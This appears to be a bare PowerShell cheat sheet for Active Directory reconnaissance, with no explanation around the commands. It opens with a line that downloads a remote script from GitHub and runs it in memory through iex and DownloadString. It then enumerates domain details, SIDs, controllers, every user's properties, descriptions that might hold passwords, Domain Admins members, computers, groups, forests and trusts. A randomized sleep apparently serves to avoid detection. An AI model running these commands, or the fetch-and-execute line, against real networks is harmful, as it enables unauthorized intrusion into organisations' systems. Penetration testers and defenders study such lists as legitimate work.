iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
Get-ADDomain
(Get-ADDomain).DomainSID
Get-ADDomainController
Get-ADUser -Filter * -Properties *
Get-AdUser -Filter * -Properties * | Select Name, logonCount
get-ADUser -Filter 'Description -like "*built*"' -properties description | select name, description
Get-ADGroupMember -Identity "Domain Admins" -Recursive
Start-Sleep (Get-Random -min 60 -max 120)
Get-ADComputer -Filter * | select Name
Get-ADGroup -Filter * | select name
Get-ADGroup -Filter 'Name -like "*admin*"' | select Name
Get-ADForest
Get-ADTrust -Filter *
